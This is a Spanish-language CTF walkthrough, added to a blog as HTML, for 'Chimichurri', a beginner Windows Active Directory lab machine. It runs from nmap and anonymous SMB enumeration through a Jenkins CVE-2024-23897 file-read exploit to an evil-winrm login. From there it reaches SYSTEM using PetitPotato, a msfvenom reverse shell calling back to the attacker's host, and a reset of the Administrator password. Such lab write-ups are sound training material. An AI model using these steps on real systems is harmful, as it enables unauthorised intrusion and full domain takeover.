@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | Chimichurri</title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg
+      stroke="currentColor"
+      fill="currentColor"
+      stroke-width="0"
+      viewBox="0 0 16 16"
+      height="1.2em"
+      width="1.2em"
+      xmlns="http://www.w3.org/2000/svg"
+    >
+      <path
+        d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"
+      ></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">Chimichurri</h2>
+          <small class="date">02 Jul 2024</small>
+          <div class="categories">
+            
+            <a href="#!" class="category">thl</a>
+            
+            <a href="#!" class="category">ctf</a>
+            
+            <a href="#!" class="category">windows</a>
+            
+            <a href="#!" class="category">AD</a>
+            
+            <a href="#!" class="category">principiante</a>
+            
+          </div>
+        </div>
+        <div class="content"><p><img src="/assets/images/chimichurri/chim.jpg" alt="image" /></p>
+
+<p>Estamos ante una máquina Windows, Active Directory, de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
+
+<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de nuestra red para averiguar que máquinas hay en ella:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth2 <span class="nt">--localnet</span>
+Interface: eth2, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:82:61:c8, IPv4: 192.168.200.100
+Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+192.168.200.1   52:54:00:12:35:00       QEMU
+192.168.200.2   52:54:00:12:35:00       QEMU
+192.168.200.4   08:00:27:0d:f5:f8       PCS Systemtechnik GmbH
+
+</code></pre></div></div>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Como vemos la máquina tiene asignada la IP <strong>192.168.200.4</strong>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> y que nos guarde a un fichero grepeable <code class="language-plaintext highlighter-rouge">-oG</code> con nombre <code class="language-plaintext highlighter-rouge">ports.txt</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">192.168.200.4</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 192.168.200.4 <span class="nt">-oG</span> ports.txt
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+6969/tcp  open  acmsoda
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown
+49674/tcp open  unknown
+49679/tcp open  unknown
+49688/tcp open  unknown
+</code></pre></div></div>
+
+<p>Como tiene un montón de puertos abiertos obtenemos la lista con el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>ports.txt | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span>
+53,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49668,49669,49670,49671,49674,49679,49688
+</code></pre></div></div>
+
+<p>Ahora hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49668,49669,49670,49671,49674,49679,49688 <span class="nt">-v</span> 192.168.200.4
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-07-02 05:07:02Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: chimichurri.thl, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: chimichurri.thl, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+6969/tcp  open  http          Jetty 10.0.11
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Panel de control <span class="o">[</span>Jenkins]
+|_http-server-header: Jetty<span class="o">(</span>10.0.11<span class="o">)</span>
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49688/tcp open  msrpc         Microsoft Windows RPC
+MAC Address: 08:00:27:0D:F5:F8 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+Service Info: Host: CHIMICHURRI<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| nbstat: NetBIOS name: CHIMICHURRI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:0d:f5:f8 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+| Names:
+|   CHIMICHURRI&lt;00&gt;      Flags: &lt;unique&gt;&lt;active&gt;
+|   CHIMICHURRI0&lt;00&gt;     Flags: &lt;group&gt;&lt;active&gt;
+|   CHIMICHURRI0&lt;1c&gt;     Flags: &lt;group&gt;&lt;active&gt;
+|   CHIMICHURRI&lt;20&gt;      Flags: &lt;unique&gt;&lt;active&gt;
+|_  CHIMICHURRI0&lt;1b&gt;     Flags: &lt;unique&gt;&lt;active&gt;
+|_clock-skew: <span class="nt">-15s</span>
+| smb2-time: 
+|   <span class="nb">date</span>: 2024-07-02T05:07:55
+|_  start_date: 2024-07-02T04:58:47
+</code></pre></div></div>
+
+<p>Añadimos nombre de dominio a nuestro fichero de hosts:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"192.168.200.4 chimichurri.thl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+192.168.200.4 chimichurri.thl
+</code></pre></div></div>
+
+<p>Para empezar vamos a mirar si hay algún recurso compartido al que se pueda acceder sin credenciales en el servicio <strong>smb</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">--no-pass</span> <span class="nt">-L</span> <span class="se">\\</span>192.168.200.4        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>         Disk      Admin remota
+        C<span class="nv">$ </span>             Disk      Recurso predeterminado
+        drogas          Disk      
+        IPC<span class="nv">$ </span>           IPC       IPC remota
+        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
+        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión
+</code></pre></div></div>
+
+<p>Encontramos un recurso compartido con el nombre <strong>drogas</strong>, nos conectamos a el para ver que contiene:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">--no-pass</span> //192.168.200.4/drogas
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Thu Jun 27 12:20:49 2024
+  ..                                  D        0  Thu Jun 27 12:20:49 2024
+  credenciales.txt                    A       95  Sun Jun 30 19:19:03 2024
+
+                7735807 blocks of size 4096. 3942367 blocks available
+</code></pre></div></div>
+
+<p>Encontramos un fichero <strong>credenciales.txt</strong>. Lo descargamos a nuestra máquina con el comando <code class="language-plaintext highlighter-rouge">get</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> get credenciales.txt 
+getting file <span class="se">\c</span>redenciales.txt of size 95 as credenciales.txt <span class="o">(</span>30.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 30.9 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<p>En nuestro equipo leemos el contenido de dicho fichero:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>credenciales.txt 
+Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico
+</code></pre></div></div>
+
+<p>De ese texto presumimos que hay un fichero <strong>perico.txt</strong> en el escritorio del usuario <strong>hacker.</strong></p>
+
+<p>Ahora pasamos a ver si hay alguna vulnerabilidad en el servicio web. Como hemos visto antes, en el puerto <strong>6969</strong> hay un servicio web. Empezamos buscando información de que tecnología esta usando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb <span class="nt">-a</span> 3 http://192.168.200.4:6969
+http://192.168.200.4:6969 <span class="o">[</span>200 OK] Cookies[JSESSIONID.d01cdd8a], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty<span class="o">(</span>10.0.11<span class="o">)]</span>, HttpOnly[JSESSIONID.d01cdd8a], IP[192.168.200.4], Jenkins[2.361.4], Jetty[10.0.11], OpenSearch[/opensearch.xml], Prototype, Script[text/javascript], Title[Panel de control <span class="o">[</span>Jenkins]], UncommonHeaders[x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
+</code></pre></div></div>
+
+<p>Vemos que está usando el framework <strong>Jenkins</strong> versión <strong>2.361.4</strong>.</p>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Buscamos en la web del incibe a ver si esa versión de Jenkins tiene alguna vulnerabilidad.  Vemos que hay una vulnerabilidad con CVE CVE-2024-23897 que permite la lectura arbitraria de archivos.</p>
+
+<p><a href="https://www.incibe.es/incibe-cert/alerta-temprana/avisos/lectura-arbitraria-de-archivos-en-jenkins">https://www.incibe.es/incibe-cert/alerta-temprana/avisos/lectura-arbitraria-de-archivos-en-jenkins</a></p>
+
+<p>Buscamos con <strong>searchsploit</strong> a ver si tenemos algún exploit disponible (si no encuentra probar a hacer searchsploit -u para actualizar la BBDD):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit jenkins CVE-2024-23897 
+
+ Exploit Title               |  Path
+<span class="nt">-----------------------------</span> <span class="nt">---------------------------------</span>
+Jenkins 2.441 - Local File I | java/webapps/51993.py
+</code></pre></div></div>
+
+<p>Vemos que hay un exploit disponible, nos lo copiamos a nuestra carpeta de trabajo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> /usr/share/exploitdb/exploits/java/webapps/51993.py <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Ejecutamos el exploit y le indicamos la url con <strong>-u</strong> y el path del fichero con <strong>-p</strong>. En este caso no es necesario añadirle la unidad (c:):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python 51993.py <span class="nt">-u</span> http://192.168.200.4:6969 <span class="nt">-p</span> /users/hacker/desktop/perico.txt
+hacker:Perico69
+</code></pre></div></div>
+
+<p>Nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y las credenciales recién obtenidas:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 192.168.200.4 <span class="nt">-u</span> hacker <span class="nt">-p</span> Perico69
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<p>Vemos que privilegios tiene el usuario <strong>hacker</strong> en la máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv
+
+INFORMACIàN DE PRIVILEGIOS
+<span class="nt">--------------------------</span>
+
+Nombre de privilegio          Descripci¢n                                  Estado
+<span class="o">=============================</span> <span class="o">============================================</span> <span class="o">==========</span>
+SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
+SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
+SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci¢n Habilitada
+SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Como tiene el privilegio <strong>SeImpersonatePrivilege</strong> habilitado procedemos a hacer la escalada usando alguna de las herramientas disponibles, en este caso <strong>PetitPotato</strong>. Nos descargamos el binario de su github:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe
+</code></pre></div></div>
+
+<p>Para compartir ficheros con la máquina victima creamos un servidor samba en nuestra máquina. Usamos <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> para crear el server, <strong>-smb2support</strong> para dar soporte a smb2, <strong>kali</strong> es el nombre que le doy al recurso compartido y <strong>.</strong> para compartir lo que tenemos en el directorio actual.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-smbserver <span class="nt">-smb2support</span> kali <span class="nb">.</span>               
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</code></pre></div></div>
+
+<p>Ejecutamos <strong>PetitPotato</strong> para obtener una <strong>cmd</strong>, pero vemos que persiste:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\d</span>esktop&gt; <span class="se">\\</span>192.168.200.100<span class="se">\k</span>ali<span class="se">\P</span>etitPotato.exe 3 cmd
+
+<span class="o">[</span>+] Malicious named pipe running on <span class="se">\\</span>.<span class="se">\p</span>ipe<span class="se">\p</span>etit<span class="se">\p</span>ipe<span class="se">\s</span>rvsvc.
+<span class="o">[</span>+] Invoking EfsRpcQueryUsersOnFile with target path: <span class="se">\\</span>localhost/pipe/petit<span class="se">\C</span><span class="nv">$\</span>wh0nqs.txt.
+
+<span class="o">[</span>+] The connection is successful.
+<span class="o">[</span>+] ImpersonateNamedPipeClient OK.
+<span class="o">[</span>+] OpenThreadToken OK.
+<span class="o">[</span>+] DuplicateTokenEx OK.
+<span class="o">[</span>+] CreateProcessAsUser OK.
+Microsoft Windows <span class="o">[</span>Versi¢n 10.0.14393]
+<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. Todos los derechos reservados.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\d</span>esktop&gt;
+</code></pre></div></div>
+
+<p>Vamos a intentar crear una shell reversa al ejecutar <strong>PetitPotato</strong>. Para ello, primero creamos un ejecutable con msfvenom para que nos de una shell reversa.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.200.100 <span class="nv">LPORT</span><span class="o">=</span>8889 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
+</code></pre></div></div>
+
+<p>La copiamos en la máquina victima:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments&gt; copy <span class="se">\\</span>192.168.200.100<span class="se">\k</span>ali<span class="se">\s</span>hell.exe <span class="nb">.</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments&gt; <span class="nb">dir
+
+    </span>Directorio: C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>         7/2/2024  10:25 PM          73802 shell.exe
+</code></pre></div></div>
+
+<p>Nos ponemos a la escucha en nuestra máquina atacante y ejecutamos <strong>PetitPotato</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments&gt; <span class="se">\\</span>192.168.200.100<span class="se">\k</span>ali<span class="se">\P</span>etitPotato.exe 2 .<span class="se">\s</span>hell.exe
+
+<span class="o">[</span>+] Malicious named pipe running on <span class="se">\\</span>.<span class="se">\p</span>ipe<span class="se">\p</span>etit<span class="se">\p</span>ipe<span class="se">\s</span>rvsvc.
+<span class="o">[</span>+] Invoking EfsRpcDecryptFileSrv with target path: <span class="se">\\</span>localhost/pipe/petit<span class="se">\C</span><span class="nv">$\</span>wh0nqs.txt.
+
+<span class="o">[</span>+] The connection is successful.
+<span class="o">[</span>+] ImpersonateNamedPipeClient OK.
+<span class="o">[</span>+] OpenThreadToken OK.
+<span class="o">[</span>+] DuplicateTokenEx OK.
+<span class="o">[</span>+] CreateProcessAsUser OK.
+</code></pre></div></div>
+
+<p>Obtenemos la shell como <strong>nt authority\system</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 8889
+listening on <span class="o">[</span>any] 8889 ...
+connect to <span class="o">[</span>192.168.200.100] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.200.4] 62914
+Microsoft Windows <span class="o">[</span>Versi?n 10.0.14393]
+<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. Todos los derechos reservados.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Ahora para obtener el acceso como <strong>Administrador</strong> lo que he hecho es cambiar la contraseña del usuario <strong>Administrador</strong> con <code class="language-plaintext highlighter-rouge">net user</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;net user administrador Murrusko0
+net user administrador Murrusko0
+Se ha completado el comando correctamente.
+</code></pre></div></div>
+
+<p>Una vez cambiada nos conectamos usando dichas credenciales:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 192.168.200.4 <span class="nt">-u</span> administrador <span class="nt">-p</span> Murrusko0
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrador<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>chimichurri0<span class="se">\a</span>dministrador
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrador<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<p>Y con esto damos por finalizada la máquina.</p>
+</div>
+      </section>
+      <footer>
+  <p>&copy; 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
